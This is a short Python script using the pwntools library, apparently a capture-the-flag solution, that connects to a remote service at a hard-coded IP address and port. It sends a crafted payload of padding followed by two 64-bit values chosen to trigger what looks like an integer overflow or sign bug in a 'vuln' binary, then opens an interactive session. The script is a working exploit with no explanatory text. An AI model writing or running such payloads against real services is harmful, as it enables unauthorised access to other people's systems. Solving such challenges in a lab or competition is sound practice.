from pwn import *

#io = process("./vuln")
io = remote("35.200.120.35",  9002)

payload = b""
payload += b"A"*0x10
payload += b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x0F" #1152921504606846975
payload += b"\x6F\x00\x00\x00\x00\x00\x00\xF0" #-1152921504606846865

io.sendlineafter("Input name: ", payload)

io.interactive()

